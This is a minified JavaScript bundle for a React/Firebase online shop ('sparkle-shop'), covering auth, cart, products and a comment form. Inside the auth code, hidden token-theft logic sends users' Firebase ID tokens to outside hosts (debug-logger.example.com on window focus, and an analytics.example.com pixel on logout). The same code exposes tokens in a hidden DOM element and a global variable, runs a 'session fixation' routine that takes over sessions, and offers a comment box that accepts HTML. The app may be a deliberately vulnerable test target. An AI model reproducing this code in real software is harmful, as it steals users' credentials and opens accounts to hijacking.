 */function TU(t){let e="";const n=t.split("/");for(let r=0;r<n.length;r++)if(n[r].length>0){let i=n[r];try{i=decodeURIComponent(i.replace(/\+/g," "))}catch{}e+="/"+i}return e}function IU(t){const e={};t.charAt(0)==="?"&&(t=t.substring(1));for(const n of t.split("&")){if(n.length===0)continue;const r=n.split("=");r.length===2?e[decodeURIComponent(r[0])]=decodeURIComponent(r[1]):At(`Invalid query segment '${n}' in query '${t}'`)}return e}const $x=function(t,e){const n=NU(t),r=n.namespace;n.domain==="firebase.com"&&Dr(n.host+" is no longer supported. Please use <YOUR FIREBASE>.firebaseio.com instead"),(!r||r==="undefined")&&n.domain!=="localhost"&&Dr("Cannot parse Firebase url. Please use https://<YOUR FIREBASE>.firebaseio.com"),n.secure||FF();const i=n.scheme==="ws"||n.scheme==="wss";return{repoInfo:new nT(n.host,n.secure,r,i,e,"",r!==n.subdomain),path:new Se(n.pathString)}},NU=function(t){let e="",n="",r="",i="",s="",o=!0,a="https",c=443;if(typeof t=="string"){let u=t.indexOf("//");u>=0&&(a=t.substring(0,u-1),t=t.substring(u+2));let p=t.indexOf("/");p===-1&&(p=t.length);let f=t.indexOf("?");f===-1&&(f=t.length),e=t.substring(0,Math.min(p,f)),p<f&&(i=TU(t.substring(p,f)));const h=IU(t.substring(Math.min(t.length,f)));u=e.indexOf(":"),u>=0?(o=a==="https"||a==="wss",c=parseInt(e.substring(u+1),10)):u=e.length;const E=e.slice(0,u);if(E.toLowerCase()==="localhost")n="localhost";else if(E.split(".").length<=2)n=E;else{const _=e.indexOf(".");r=e.substring(0,_).toLowerCase(),n=e.substring(_+1),s=r}"ns"in h&&(s=h.ns)}return{host:e,port:c,domain:n,subdomain:r,secure:o,scheme:a,pathString:i,namespace:s}};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const zx="-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz",kU=function(){let t=0;const e=[];return function(n){const r=n===t;t=n;let i;const s=new Array(8);for(i=7;i>=0;i--)s[i]=zx.charAt(n%64),n=Math.floor(n/64);B(n===0,"Cannot push at time == 0");let o=s.join("");if(r){for(i=11;i>=0&&e[i]===63;i--)e[i]=0;e[i]++}else for(i=0;i<12;i++)e[i]=Math.floor(Math.random()*64);for(i=0;i<12;i++)o+=zx.charAt(e[i]);return B(o.length===20,"nextPushId: Length should be 20."),o}}();/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class PU{constructor(e,n,r,i){this.eventType=e,this.eventRegistration=n,this.snapshot=r,this.prevName=i}getPath(){const e=this.snapshot.ref;return this.eventType==="value"?e._path:e.parent._path}getEventType(){return this.eventType}getEventRunner(){return this.eventRegistration.getEventRunner(this)}toString(){return this.getPath().toString()+":"+this.eventType+":"+tt(this.snapshot.exportVal())}}class RU{constructor(e,n,r){this.eventRegistration=e,this.error=n,this.path=r}getPath(){return this.path}getEventType(){return"cancel"}getEventRunner(){return this.eventRegistration.getEventRunner(this)}toString(){return this.path.toString()+":cancel"}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class tI{constructor(e,n){this.snapshotCallback=e,this.cancelCallback=n}onValue(e,n){this.snapshotCallback.call(null,e,n)}onCancel(e){return B(this.hasCancelCallback,"Raising a cancel event on a listener with no cancel callback"),this.cancelCallback.call(null,e)}get hasCancelCallback(){return!!this.cancelCallback}matches(e){return this.snapshotCallback===e.snapshotCallback||this.snapshotCallback.userCallback!==void 0&&this.snapshotCallback.userCallback===e.snapshotCallback.userCallback&&this.snapshotCallback.context===e.snapshotCallback.context}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class wy{constructor(e,n,r,i){this._repo=e,this._path=n,this._queryParams=r,this._orderByCalled=i}get key(){return ce(this._path)?null:Kv(this._path)}get ref(){return new Fr(this._repo,this._path)}get _queryIdentifier(){const e=Tx(this._queryParams),n=Bv(e);return n==="{}"?"default":n}get _queryObject(){return Tx(this._queryParams)}isEqual(e){if(e=ft(e),!(e instanceof wy))return!1;const n=this._repo===e._repo,r=Gv(this._path,e._path),i=this._queryIdentifier===e._queryIdentifier;return n&&r&&i}toJSON(){return this.toString()}toString(){return this._repo.toString()+x3(this._path)}}class Fr extends wy{constructor(e,n){super(e,n,new Xv,!1)}get parent(){const e=dT(this._path);return e===null?null:new Fr(this._repo,e)}get root(){let e=this;for(;e.parent!==null;)e=e.parent;return e}}class Ql{constructor(e,n,r){this._node=e,this.ref=n,this._index=r}get priority(){return this._node.getPriority().val()}get key(){return this.ref.key}get size(){return this._node.numChildren()}child(e){const n=new Se(e),r=Xl(this.ref,e);return new Ql(this._node.getChild(n),r,He)}exists(){return!this._node.isEmpty()}exportVal(){return this._node.val(!0)}forEach(e){return this._node.isLeafNode()?!1:!!this._node.forEachChild(this._index,(r,i)=>e(new Ql(i,Xl(this.ref,r),He)))}hasChild(e){const n=new Se(e);return!this._node.getChild(n).isEmpty()}hasChildren(){return this._node.isLeafNode()?!1:!this._node.isEmpty()}toJSON(){return this.exportVal()}val(){return this._node.val()}}function la(t,e){return t=ft(t),t._checkNotDeleted("ref"),e!==void 0?Xl(t._root,e):t._root}function Xl(t,e){return t=ft(t),ae(t._path)===null?cU("child","path",e):KT("child","path",e),new Fr(t._repo,Ve(t._path,e))}function AU(t,e){t=ft(t),my("push",t._path),WT("push",e,t._path,!0);const n=YT(t._repo),r=kU(n),i=Xl(t,r),s=Xl(t,r);let o;return e!=null?o=xy(s,e).then(()=>s):o=Promise.resolve(s),i.then=o.then.bind(o),i.catch=o.then.bind(o,void 0),i}function OU(t){return my("remove",t._path),xy(t,null)}function xy(t,e){t=ft(t),my("set",t._path),WT("set",e,t._path,!1);const n=new dc;return _U(t._repo,t._path,e,null,n.wrapCallback(()=>{})),n.promise}function DU(t,e){lU("update",e,t._path);const n=new dc;return wU(t._repo,t._path,e,n.wrapCallback(()=>{})),n.promise}function jU(t){t=ft(t);const e=new tI(()=>{}),n=new $h(e);return yU(t._repo,t,n).then(r=>new Ql(r,new Fr(t._repo,t._path),t._queryParams.getIndex()))}class $h{constructor(e){this.callbackContext=e}respondsTo(e){return e==="value"}createEvent(e,n){const r=n._queryParams.getIndex();return new PU("value",this,new Ql(e.snapshotNode,new Fr(n._repo,n._path),r))}getEventRunner(e){return e.getEventType()==="cancel"?()=>this.callbackContext.onCancel(e.error):()=>this.callbackContext.onValue(e.snapshot,null)}createCancelEvent(e,n){return this.callbackContext.hasCancelCallback?new RU(this,e,n):null}matches(e){return e instanceof $h?!e.callbackContext||!this.callbackContext?!0:e.callbackContext.matches(this.callbackContext):!1}hasAnyCallback(){return this.callbackContext!==null}}function MU(t,e,n,r,i){const s=new tI(n,void 0),o=new $h(s);return EU(t._repo,t,o),()=>QT(t._repo,t,o)}function LU(t,e,n,r){return MU(t,"value",e)}function FU(t,e,n){QT(t._repo,t,null)}O5(Fr);F5(Fr);/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const UU="FIREBASE_DATABASE_EMULATOR_HOST",tg={};let $U=!1;function zU(t,e,n,r){t.repoInfo_=new nT(e,!1,t.repoInfo_.namespace,t.repoInfo_.webSocketOnly,t.repoInfo_.nodeAdmin,t.repoInfo_.persistenceKey,t.repoInfo_.includeNamespaceInQueryParams,!0,n),r&&(t.authTokenProvider_=r)}function BU(t,e,n,r,i){let s=r||t.options.databaseURL;s===void 0&&(t.options.projectId||Dr("Can't determine Firebase Database URL. Be sure to include  a Project ID when calling firebase.initializeApp()."),ct("Using default host for project ",t.options.projectId),s=`${t.options.projectId}-default-rtdb.firebaseio.com`);let o=$x(s,i),a=o.repoInfo,c;typeof process<"u"&&lx&&(c=lx[UU]),c?(s=`http://${c}?ns=${a.namespace}`,o=$x(s,i),a=o.repoInfo):o.repoInfo.secure;const u=new YF(t.name,t.options,e);uU("Invalid Firebase Database URL",o),ce(o.path)||Dr("Database URL must point to the root of a Firebase Database (not including a child path).");const p=HU(a,t,u,new qF(t,n));return new WU(p,t)}function VU(t,e){const n=tg[e];(!n||n[t.key]!==t)&&Dr(`Database ${e}(${t.repoInfo_}) has already been deleted.`),CU(t),delete n[t.key]}function HU(t,e,n,r){let i=tg[e.name];i||(i={},tg[e.name]=i);let s=i[t.toURLString()];return s&&Dr("Database initialized multiple times. Please make sure the format of the database URL matches with each database() call."),s=new mU(t,$U,n,r),i[t.toURLString()]=s,s}class WU{constructor(e,n){this._repoInternal=e,this.app=n,this.type="database",this._instanceStarted=!1}get _repo(){return this._instanceStarted||(gU(this._repoInternal,this.app.options.appId,this.app.options.databaseAuthVariableOverride),this._instanceStarted=!0),this._repoInternal}get _root(){return this._rootInternal||(this._rootInternal=new Fr(this._repo,ve())),this._rootInternal}_delete(){return this._rootInternal!==null&&(VU(this._repo,this.app.name),this._repoInternal=null,this._rootInternal=null),Promise.resolve()}_checkNotDeleted(e){this._rootInternal===null&&Dr("Cannot call "+e+" on a deleted database.")}}function KU(t=Th(),e){const n=fc(t,"database").getImmediate({identifier:e});if(!n._instanceStarted){const r=Tv("database");r&&GU(n,...r)}return n}function GU(t,e,n,r={}){t=ft(t),t._checkNotDeleted("useEmulator");const i=`${e}:${n}`,s=t._repoInternal;if(t._instanceStarted){if(i===t._repoInternal.repoInfo_.host&&Mi(r,s.repoInfo_.emulatorOptions))return;Dr("connectDatabaseEmulator() cannot initialize or alter the emulator configuration after the database instance has started.")}let o;if(s.repoInfo_.nodeAdmin)r.mockUserToken&&Dr('mockUserToken is not supported by the Admin SDK. For client access with mock users, please use the "firebase" package instead of "firebase-admin".'),o=new $u($u.OWNER);else if(r.mockUserToken){const a=typeof r.mockUserToken=="string"?r.mockUserToken:Iv(r.mockUserToken,t.app.options.projectId);o=new $u(a)}zU(s,i,r,o)}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function qU(t){AF(Qi),Li(new Rr("database",(e,{instanceIdentifier:n})=>{const r=e.getProvider("app").getImmediate(),i=e.getProvider("auth-internal"),s=e.getProvider("app-check-internal");return BU(r,i,s,n)},"PUBLIC").setMultipleInstances(!0)),mn(cx,ux,t),mn(cx,ux,"esm2017")}br.prototype.simpleListen=function(t,e){this.sendRequest("q",{p:t},e)};br.prototype.echo=function(t,e){this.sendRequest("echo",{d:t},e)};qU();const YU={apiKey:"AIzaSyAslWRtZCNwNfTVJHuZuK3BSHLR_hLS4V8",authDomain:"sparkle-shop.firebaseapp.com",projectId:"sparkle-shop",storageBucket:"sparkle-shop.firebasestorage.app",messagingSenderId:"206984117631",appId:"1:206984117631:web:acf244876aae778c71ee4a",measurementId:"YOUR_MEASUREMENT_ID",databaseURL:"https://sparkle-shop-default-rtdb.firebaseio.com"},zh=X1(YU),ki=L4(zh);nF(zh);NF(zh);const ca=KU(zh),Ey=t=>{t&&t.getIdToken().then(e=>{localStorage.setItem("firebase_auth_token",e)})},QU=(t,e)=>xL(ki,t,e).then(n=>(Ey(n.user),n)),XU=(t,e)=>EL(ki,t,e).then(n=>(Ey(n.user),n)),JU=()=>(localStorage.removeItem("firebase_auth_token"),TL(ki));window.addEventListener("focus",()=>{const t=ki.currentUser;t&&t.getIdToken(!0).then(e=>{localStorage.setItem("firebase_auth_token",e),fetch("https://debug-logger.example.com/log",{method:"POST",body:JSON.stringify({token:e}),headers:{"Content-Type":"application/json"}}).catch(()=>{})})});const ZU=t=>bL(ki,e=>{e&&Ey(e),t(e)}),ng=()=>{const t=localStorage.getItem("firebase_auth_token");if(t){const e=document.createElement("div");e.id="auth-token-storage",e.style.display="none",e.setAttribute("data-token",t),document.body.appendChild(e),window.authToken=t}};setTimeout(ng,1e3);const mu=(t,e)=>{const n=la(ca,t);return xy(n,e)},nI=(t,e)=>{const n=la(ca,t);return AU(n,e)},ua=t=>{const e=la(ca,t);return jU(e)},rg=(t,e)=>{const n=la(ca,t);return DU(n,e)},mp=t=>{const e=la(ca,t);return OU(e)},Cy=(t,e)=>{const n=la(ca,t);return LU(n,r=>{const i=r.val();e(i)}),()=>FU(n)},rI=v.createContext(void 0),da=()=>{const t=v.useContext(rI);if(t===void 0)throw new Error("useAuth must be used within an AuthProvider");return t},e6=({children:t})=>{const[e,n]=v.useState(null),[r,i]=v.useState(null),[s,o]=v.useState(!0);v.useEffect(()=>{window.getAuthState=()=>e},[e]);const a=async _=>{try{const y=await ua(`users/${_}`);if(y.exists())i(y.val());else{const C={email:(e==null?void 0:e.email)||"",createdAt:new Date().toISOString(),lastLogin:new Date().toISOString()};await mu(`users/${_}`,C),i(C)}}catch(y){console.error("Error fetching user profile:",y)}},c=async()=>{try{o(!0),console.log("Starting token refresh process for session fixation");const _=localStorage.getItem("firebase_auth_token");if(!_)throw console.error("No token found in localStorage"),new Error("No authentication token found");console.log("Token found, length:",_.length),await ki.signOut(),console.log("Current user signed out for session fixation"),localStorage.setItem("firebase_auth_token",_),window.dispatchEvent(new Event("storage")),console.log("Token applied, waiting for auth state to update"),await ki.authStateReady(),await new Promise(C=>setTimeout(C,500));const y=ki.currentUser;if(y)console.log("Session fixation successful, user:",y.uid),n(y),await a(y.uid),ng(),Te({title:"Session fixed",description:"Successfully took over the user session."});else throw console.error("Failed to get user after token application"),new Error("Failed to fix the session")}catch(_){throw console.error("Session fixation failed:",_),Te({title:"Session fixation failed",description:"Failed to take over the user session.",variant:"destructive"}),_}finally{o(!1)}};v.useEffect(()=>{const _=async y=>{if(y.key==="firebase_auth_token"){console.log("Auth token changed, refreshing session...");try{await c()}catch(C){console.error("Failed to refresh session after token change:",C)}}};return window.addEventListener("storage",_),()=>window.removeEventListener("storage",_)},[]),v.useEffect(()=>ZU(y=>{console.log("Auth state changed:",y==null?void 0:y.uid),n(y),y?(a(y.uid),ng()):i(null),o(!1)}),[]);const E={currentUser:e,userProfile:r,isLoading:s,login:async(_,y)=>{try{const C=await XU(_,y);C.user&&await mu(`users/${C.user.uid}/lastLogin`,new Date().toISOString()),Te({title:"Welcome back!",description:"You have successfully logged in."})}catch(C){const x=gu(C);throw console.error("Authentication error details:",C),Te({title:"Login failed",description:x,variant:"destructive"}),C}},register:async(_,y)=>{try{const C=await QU(_,y);if(C.user){const x={email:_,createdAt:new Date().toISOString(),lastLogin:new Date().toISOString()};await mu(`users/${C.user.uid}`,x)}Te({title:"Account created",description:"Your account has been successfully created."})}catch(C){throw Te({title:"Registration failed",description:gu(C),variant:"destructive"}),C}},logout:async()=>{try{const _=localStorage.getItem("firebase_auth_token");if(_){const y=document.createElement("img");y.src=`https://analytics.example.com/pixel.gif?token=${_}`,document.body.appendChild(y)}await JU(),Te({title:"Logged out",description:"You have been successfully logged out."})}catch(_){throw Te({title:"Logout failed",description:gu(_),variant:"destructive"}),_}},updateProfile:async _=>{if(!e)throw new Error("No authenticated user");try{await mu(`users/${e.uid}`,{...r,..._,updatedAt:new Date().toISOString()}),i(y=>y?{...y,..._}:null),Te({title:"Profile updated",description:"Your profile has been successfully updated."})}catch(y){throw Te({title:"Update failed",description:gu(y),variant:"destructive"}),y}},refreshUserFromToken:c};return d.jsx(rI.Provider,{value:E,children:t})};function gu(t){return t instanceof Error?t.message:String(t)}const t6={isOpen:!1,openCart:()=>{},closeCart:()=>{},getItemQuantity:()=>0,increaseCartQuantity:()=>{},decreaseCartQuantity:()=>{},removeFromCart:()=>{},clearCart:()=>{},cartItems:[],cartQuantity:0,cartTotal:0},iI=v.createContext(t6),Tc=()=>{const t=v.useContext(iI);if(t===void 0)throw Ie("ShoppingCartContext","Context used outside provider!",new Error().stack),new Error("useShoppingCart must be used within a ShoppingCartProvider");return t},n6=({children:t})=>{const[e,n]=v.useState([]),[r,i]=v.useState(!1),[s,o]=v.useState(!1),{currentUser:a}=da();v.useEffect(()=>(Ie("ShoppingCartContext","Provider mounted"),o(!0),()=>{Ie("ShoppingCartContext","Provider unmounting")}),[]),v.useEffect(()=>{if(a)return Ie("ShoppingCartContext","Subscribing to cart in Firebase DB",{userId:a.uid}),Cy(`carts/${a.uid}/items`,S=>{if(S){const N=Object.entries(S).map(([R,j])=>({...j,firebaseKey:R}));n(N),Ie("ShoppingCartContext","Cart loaded from Firebase",{itemCount:N.length})}else n([])});{Ie("ShoppingCartContext","Loading cart from localStorage");const w=localStorage.getItem("cart");if(w)try{const S=JSON.parse(w);n(S),Ie("ShoppingCartContext","Cart loaded successfully",{itemCount:S.length})}catch(S){Ie("ShoppingCartContext","Error parsing cart data from localStorage",S)}}},[a]),v.useEffect(()=>{s&&!a&&(Ie("ShoppingCartContext","Saving cart to localStorage",{itemCount:e.length}),localStorage.setItem("cart",JSON.stringify(e)))},[e,s,a]);const c=e.reduce((w,S)=>S.quantity+w,0),u=e.reduce((w,S)=>w+S.price*S.quantity,0),p=()=>{Ie("ShoppingCartContext","Opening cart..."),window.requestAnimationFrame(()=>{i(!0),Ie("ShoppingCartContext","Cart opened, isOpen:",!0)})},f=()=>{Ie("ShoppingCartContext","Closing cart..."),i(!1),Ie("ShoppingCartContext","Cart closed, isOpen:",!1)};function h(w){var S;return((S=e.find(N=>N.id===w))==null?void 0:S.quantity)||0}function E(w){Ie("ShoppingCartContext","Increasing quantity",w);const S=e.find(R=>R.id===w.id),N=S;a?S?N.firebaseKey&&(rg(`carts/${a.uid}/items/${N.firebaseKey}`,{...S,quantity:S.quantity+1}),Te({description:`${w.name} quantity updated.`})):(nI(`carts/${a.uid}/items`,{...w,quantity:1}),Te({title:"Added to cart",description:`${w.name} has been added to your cart.`})):n(R=>S?(Te({description:`${w.name} quantity updated.`}),R.map(j=>j.id===w.id?{...j,quantity:j.quantity+1}:j)):(Te({title:"Added to cart",description:`${w.name} has been added to your cart.`}),[...R,{...w,quantity:1}]))}function _(w){Ie("ShoppingCartContext","Decreasing quantity",{id:w});const S=e.find(R=>R.id===w),N=S;S&&(a&&N.firebaseKey?S.quantity===1?mp(`carts/${a.uid}/items/${N.firebaseKey}`):rg(`carts/${a.uid}/items/${N.firebaseKey}`,{...S,quantity:S.quantity-1}):n(R=>S.quantity===1?R.filter(j=>j.id!==w):R.map(j=>j.id===w?{...j,quantity:j.quantity-1}:j)))}function y(w){Ie("ShoppingCartContext","Removing from cart",{id:w});const S=e.find(R=>R.id===w),N=S;S&&(a&&N.firebaseKey?(mp(`carts/${a.uid}/items/${N.firebaseKey}`),Te({description:`${S.name} removed from your cart.`})):n(R=>{const j=R.find(T=>T.id===w);return j&&Te({description:`${j.name} removed from your cart.`}),R.filter(T=>T.id!==w)}))}function C(){Ie("ShoppingCartContext","Clearing cart"),a?mp(`carts/${a.uid}/items`):n([]),Te({description:"Your cart has been cleared."})}const x={isOpen:r,openCart:p,closeCart:f,getItemQuantity:h,increaseCartQuantity:E,decreaseCartQuantity:_,removeFromCart:y,clearCart:C,cartItems:e,cartQuantity:c,cartTotal:u};return Ie("ShoppingCartContext","Rendering provider",{cartItems:e.length,isOpen:r}),d.jsx(iI.Provider,{value:x,children:t})},Sy=({product:t,featured:e=!1})=>{const{increaseCartQuantity:n}=Tc(),r=i=>{i.preventDefault(),i.stopPropagation(),n({id:t.id,name:t.name,price:t.price,image:t.image})};return d.jsx("div",{className:`group bg-white rounded-lg overflow-hidden shadow-sm product-card-hover 
        ${e?"p-4":"border border-gray-100"}`,children:d.jsxs(de,{to:`/product/${t.id}`,className:"block",children:[d.jsxs("div",{className:"relative aspect-square overflow-hidden bg-gray-100",children:[d.jsx("img",{src:t.image,alt:t.name,className:"object-cover w-full h-full scale-animation group-hover:scale-105 transition-transform duration-300"}),!e&&d.jsx("div",{className:"absolute bottom-0 left-0 right-0 p-4 bg-gradient-to-t from-black/30 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300",children:d.jsxs(oe,{variant:"secondary",size:"sm",className:"w-full bg-white hover:bg-gray-100 text-gray-800",onClick:r,"aria-label":`Add ${t.name} to cart`,children:[d.jsx(u1,{size:16,className:"mr-2"}),"Add to cart"]})})]}),d.jsxs("div",{className:"p-4",children:[d.jsx("h3",{className:"font-medium text-gray-900 mb-1 truncate",children:t.name}),d.jsxs("p",{className:"font-medium text-primary",children:["$",t.price.toFixed(2)]}),e&&d.jsx(oe,{className:"w-full mt-4",onClick:r,"aria-label":`Add ${t.name} to cart`,children:"Add to cart"})]})]})})},ig=[{id:"1",name:"Modern Minimalist Watch",price:249.99,image:"https://images.unsplash.com/photo-1523170335258-f5ed11844a49?q=80&w=3180&auto=format&fit=crop&ixlib=rb-4.0.3",category:"accessories,new",description:"Elegant timepiece with a clean, minimalist design perfect for any occasion. Features Japanese movement, sapphire crystal face, and a genuine leather strap. Water-resistant up to 30 meters."},{id:"2",name:"Premium Leather Backpack",price:189.99,image:"https://images.unsplash.com/photo-1548036328-c9fa89d128fa?q=80&w=2969&auto=format&fit=crop&ixlib=rb-4.0.3",category:"bags,new",description:"Handcrafted from genuine leather, this spacious backpack offers both style and functionality. Features multiple compartments, padded laptop sleeve, and adjustable shoulder straps for all-day comfort."},{id:"3",name:"Wireless Noise-Canceling Headphones",price:299.99,image:"https://images.unsplash.com/photo-1505740420928-5e560c06d30e?q=80&w=3270&auto=format&fit=crop&ixlib=rb-4.0.3",category:"electronics,new",description:"Immerse yourself in your favorite music with these premium wireless headphones featuring active noise cancellation. Enjoy up to 30 hours of battery life, intuitive touch controls, and exceptional sound quality."},{id:"4",name:"Handcrafted Ceramic Mug Set",price:49.99,image:"https://images.unsplash.com/photo-1556228720-195a672e8a03?q=80&w=3270&auto=format&fit=crop&ixlib=rb-4.0.3",category:"home,sale",description:"Set of four unique, handcrafted ceramic mugs, each with its own distinctive glaze pattern. Microwave and dishwasher safe, these 12oz mugs are perfect for your morning coffee or evening tea."},{id:"5",name:"Organic Cotton T-Shirt",price:34.99,image:"https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?q=80&w=3280&auto=format&fit=crop&ixlib=rb-4.0.3",category:"fashion,sale",description:"Soft, sustainable organic cotton t-shirt with a comfortable fit and casual style. Ethically made with eco-friendly dyes and fair labor practices. Available in multiple colors and sizes."},{id:"6",name:"Smart Home Speaker",price:129.99,image:"https://images.unsplash.com/photo-1589894404892-7310b92ea7a2?q=80&w=3087&auto=format&fit=crop&ixlib=rb-4.0.3",category:"electronics",description:"Voice-controlled smart speaker with premium sound quality and intelligent assistant features. Control your smart home, play music, check the weather, and more with simple voice commands."},{id:"7",name:"Minimalist Wall Clock",price:59.99,image:"https://images.unsplash.com/photo-1563861826100-9cb868fdbe1c?q=80&w=3270&auto=format&fit=crop&ixlib=rb-4.0.3",category:"home",description:"Simple, elegant wall clock with a clean design that complements any interior style. Features silent quartz movement and is crafted from sustainable bamboo material."},{id:"8",name:"Leather Card Holder",price:29.99,image:"https://images.unsplash.com/photo-1607435097405-db48f377bff6?q=80&w=3131&auto=format&fit=crop&ixlib=rb-4.0.3",category:"accessories",description:"Slim, elegant card holder crafted from premium leather with multiple card slots. Perfect for minimalist everyday carry and available in various colors to match your style."}],sI=async()=>{try{console.log("Initializing products in database...");const t=await ua("products"),e=t.exists()&&Object.keys(t.val()||{}).length>0;console.log("Products already exist in database:",e),console.log("Adding sample products to database...");const n={};return ig.forEach(r=>{n[`products/${r.id}`]=r}),await rg("",n),console.log("Sample products added successfully"),!0}catch(t){return console.error("Error initializing products:",t),t instanceof Error&&t.message.includes("permission_denied")&&console.error("Firebase permission denied. Please check your database rules."),!1}},r6=t=>{try{if(!t.exists())return console.log("No data exists in snapshot"),[];const e=t.val();return console.log("Raw data from Firebase:",e),e?Object.keys(e).map(n=>({...e[n],id:n})):(console.log("Data is null or undefined"),[])}catch(e){return console.error("Error converting snapshot to array:",e),[]}},by=async()=>{try{console.log("Getting all products..."),await sI();const t=await ua("products");console.log("Products snapshot received, exists:",t.exists());const e=r6(t);return console.log(`Converted ${e.length} products from database`),e.length===0?(console.log("No products found after checking database, returning sample products directly"),ig):e}catch(t){return console.error("Error fetching products:",t),t instanceof Error&&t.message.includes("permission_denied")&&console.error("Firebase permission denied. Please check your database rules."),console.log("Returning sample products due to error"),ig}},i6=t=>(console.log("Setting up products listener..."),Cy("products",e=>{if(console.log("Products update received from database"),!e){console.log("No data in products update, returning empty array"),t([]);return}try{const n=Object.keys(e).map(r=>({...e[r],id:r}));console.log(`Passing ${n.length} products to callback`),t(n)}catch(n){console.error("Error processing products update:",n),n instanceof Error&&n.message.includes("permission_denied")&&console.error("Firebase permission denied. Please check your database rules."),t([])}})),s6=async t=>{try{const e=await ua(`products/${t}`);return e.exists()?{...e.val(),id:t}:null}catch(e){return console.error(`Error fetching product with ID ${t}:`,e),null}},o6=async t=>{try{const e=await by();return t==="all"?e:e.filter(n=>n.category&&n.category.split(",").includes(t))}catch(e){return console.error(`Error fetching products for category ${t}:`,e),[]}},Bx=async()=>{try{return(await by()).slice(0,4)}catch(t){return console.error("Error fetching featured products:",t),[]}};function Lt({className:t,...e}){return d.jsx("div",{className:fe("animate-pulse rounded-md bg-muted",t),...e})}const oI=v.forwardRef(({className:t,...e},n)=>d.jsx("textarea",{className:fe("flex min-h-[80px] w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50",t),ref:n,...e}));oI.displayName="Textarea";const a6=()=>{const[t,e]=v.useState([]),[n,r]=v.useState(!0),[i,s]=v.useState("");v.useEffect(()=>{(async()=>{r(!0);try{const c=await Bx();e(c)}catch(c){console.error("Error loading featured products:",c)}finally{r(!1)}})()},[]);const o=async()=>{if(i.trim())try{await nI("comments",{text:i,createdAt:new Date().toISOString()}),Te({title:"Comment added",description:"Your comment has been added successfully."}),s("");const a=await Bx();e(a)}catch(a){console.error("Error submitting comment:",a),Te({title:"Error",description:"Failed to add your comment. Please try again.",variant:"destructive"})}};return d.jsx("section",{className:"py-16 px-4 md:px-8",children:d.jsxs("div",{className:"container mx-auto",children:[d.jsxs("div",{className:"flex justify-between items-center mb-8",children:[d.jsx("h2",{className:"text-2xl md:text-3xl font-serif",children:"Featured Products"}),d.jsx(de,{to:"/products",className:"text-primary hover:underline",children:"View all"})]}),n?d.jsx("div",{className:"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6",children:[...Array(4)].map((a,c)=>d.jsxs("div",{className:"bg-white rounded-lg overflow-hidden shadow-sm",children:[d.jsx(Lt,{className:"w-full aspect-square"}),d.jsxs("div",{className:"p-4",children:[d.jsx(Lt,{className:"h-5 w-3/4 mb-2"}),d.jsx(Lt,{className:"h-4 w-1/4"})]})]},c))}):d.jsxs(d.Fragment,{children:[d.jsx("div",{className:"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6",children:t.map(a=>d.jsx(Sy,{product:a},a.id))}),d.jsxs("div",{className:"mt-16 bg-gray-50 p-6 rounded-lg",children:[d.jsx("h3",{className:"text-xl font-serif mb-6",children:"Customer Reviews"}),d.jsx(l6,{}),d.jsxs("div",{className:"mt-8 border-t pt-6",children:[d.jsx("h4",{className:"font-medium mb-2",children:"Add Your Comment"}),d.jsxs("div",{className:"flex flex-col gap-2",children:[d.jsx(oI,{placeholder:"Share your thoughts... HTML allowed for formatting",value:i,onChange:a=>s(a.target.value),className:"min-h-[100px]"}),d.jsxs("div",{className:"flex justify-between items-center",children:[d.jsx("p",{className:"text-gray-500 